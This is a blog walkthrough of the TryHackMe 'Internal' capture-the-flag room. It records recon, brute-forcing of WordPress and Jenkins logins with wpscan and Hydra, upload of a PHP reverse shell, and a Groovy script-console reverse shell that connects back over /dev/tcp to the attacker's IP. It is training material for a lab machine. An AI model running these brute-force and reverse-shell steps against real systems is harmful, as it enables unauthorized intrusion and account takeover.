---
title: TryHackMe Internal
date: 2021-08-10T11:44:25+05:30
lastmod: 2021-08-10T11:44:25+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - internal


draft: false
description: TryHackMe Room Internal solved by Animesh Roy. this is a walkthrough. read more...

---

## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|internal|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/8f245ccd549148ce6c6f76a583b842d6.jpeg)|
| <b> Room [Subscription Required] </b>| [internal]()https://tryhackme.com/room/internal|

## Task 01: Pre-engagement Briefing

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

* User.txt
* Root.txt

Additionally, the client has provided the following scope allowances:

* Ensure that you modify your hosts file to reflect internal.thm
* Any tools or techniques are permitted in this engagement
* Locate and note all vulnerabilities found
* Submit the flags discovered to the dashboard
* Only the IP address assigned to your machine is in scope

**Note** - this room can be completed without Metasploit---

## Task 02: Deploy and Engage the Client Environment

## Recon

* nmap

     ```bash
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 11:53 IST
     Nmap scan report for 10.10.109.3
     Host is up (0.16s latency).
     Not shown: 998 closed ports
     PORT   STATE SERVICE VERSION
     22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
     |   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
     |_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
     80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
     |_http-server-header: Apache/2.4.29 (Ubuntu)
     |_http-title: Apache2 Ubuntu Default Page: It works
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 22.13 seconds
     ```

* 2 ports aare OPEN. I did ran `full port` scan to be sure and returns no results so, not mentioning them here.

### HTTP

* Default page: returns defalult apache web-paage
  
  ![img](https://i.imgur.com/o3CYnyI.png)

* Directory Buster, returns `/blog` directory.
  
     ```bash
     gobuster dir -u http://10.10.109.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o internaal-root.gobuster
     ===============================================================
     Gobuster v3.1.0
     by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
     ===============================================================
     [+] Url:                     http://10.10.109.3
     [+] Method:                  GET
     [+] Threads:                 10
     [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
     [+] Negative Status codes:   404
     [+] User Agent:              gobuster/3.1.0
     [+] Timeout:                 10s
     ===============================================================
     2021/08/10 12:00:47 Starting gobuster in directory enumeration mode
     ===============================================================
     /blog                 (Status: 301) [Size: 309] [--> http://10.10.109.3/blog/]
     /wordpress            (Status: 301) [Size: 314] [--> http://10.10.109.3/wordpress/]
     ```

* exploring `/blog` dir

* found `internal domain`: let's add it to `/etc/hosts`
  
  ![img](https://i.imgur.com/ZwydzEa.png)

* CMS identified as `wordpress`:
  
  ![img](https://i.imgur.com/l14a5Dm.png)

* `Wordpress` enumeration:
  
```bash
wpscan --url http://internal.thm/blog -e vp,u

[+] URL: http://internal.thm/blog/ [10.10.109.3]

Interesting Finding(s):

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```

* found a Valid username, let's try bruteforcing with `wpscan`:

```bash
wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 30

[+] Performing password attack on Xmlrpc against 1 user/s
[!] Valid Combinations Found:
 | Username: admin, Password: [password-was-here]
```

* Creds worked just fine, now we're logged in as `admin` in wordpress! let's use a php shell to gain backdoor access.

## user

* find and edit php shell:

     ```bash
     # Find shell: (in Kali linux )
     cp /usr/share/laudanum/php/php-reverse-shell.php shell.php #copy shell to current dir ~/thm/internal/www

     # edit the IP & port

     $ip = '10.17.4.40';  // CHANGE THIS
     $port = 1337;       // CHANGE THIS
     ```

* upload shell:
  
  ![img](https://i.imgur.com/OXq644A.png)

* get the access:
  
  ![img](https://i.imgur.com/cElXG8O.png)

* can't read `user.txt`
  
     ```bash
     $ ls -l /home
     total 4
     drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
     ```

* enumeration # got hint for look into `/opt`

     ```bash
     $ ls /opt
     containerd
     wp-save.txt
     $ cat /opt/wp-save.txt
     Bill,
     Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
     aubreanna:[password-was-here]
     ```

* SSH into box

     ```bash
     ssh aubreanna@10.10.109.3
     ```

     ![img](https://i.imgur.com/QY6KMmb.png)

---

## Root

* we do have a `jenkins.txt` in ~/user dir. let's read that!
* it reveals there is a jenkins server running on internal IP:port

* SSH again with `PORT` forwarding to our machine, in order to access the `jenkins` service.

  ![img](https://i.imgur.com/7VuFIMR.png)

* We can then visit the Jenkins server web page by visiting 127.0.0.1:8080
  
  ![img](https://i.imgur.com/aA8nuXg.png)

* tried found creds, but no luck! 😭 the ROOM Developer loves `bruteforce` I guess.

* Bruteforcing `jenkins`

     ```bash
     # POST DATA:

     POST /j_acegi_security_check HTTP/1.1
     Host: 127.0.0.1:8080
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 54
     Origin: http://127.0.0.1:8080
     Connection: close
     Referer: http://127.0.0.1:8080/loginError
     Cookie: JSESSIONID.851f9285=node0c86ow5ll7bfx1kor9ova06bxn0.node0
     Upgrade-Insecure-Requests: 1

     j_username=admin&j_password=er&from=%2F&Submit=Sign+in 
     ```

* Hydra payload

     ```bash
     hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt

     * -s: port number
     * -f: Stop brute forcing the login page once the password is found.
     * -V: Display the attempts being made by Hydra and other details.
     * http-form-post: Indicates the type of form being used (i.e. POST).
     * ^USER^: tells Hydra to use the username or list in the field.
     * ^PASS^: tells Hydra to use the password list supplied.
     * -l: indicates a single username e.g. “admin”(use -L for a username list).
     * -P: indicates use the following password list e.g. rockyou.txt
     ```

* Using found creds to login to `jenkins`

* A quick search on Google reveals a number of ways to gain a reverse shell by exploiting vulnerabilities in Jenkins. The method I used was to exploit the Script Console feature on Jenkins (see references).

     ![img](https://i.imgur.com/Q0p4wB4.png)

* To create a reverse shell on the system, we need to use Groovy script. Since it is basically Java, we can use a Java reverse shell from pentestmonkey.

     ```zsh
     r = Runtime.getRuntime()
     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.17.4.40/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
     ```

* reverse connection is active
  
  ![img](https://i.imgur.com/4oJX935.png)

* room developer must love `/opt` dir, without hint or heating your head against wall this is no way to find why it's there

     ![img](https://i.imgur.com/2zdrVfH.png)

* using the found creds login via SSH as root!

* got the damn ROOt!!!

     ![img](https://i.imgur.com/DQyAPFi.png)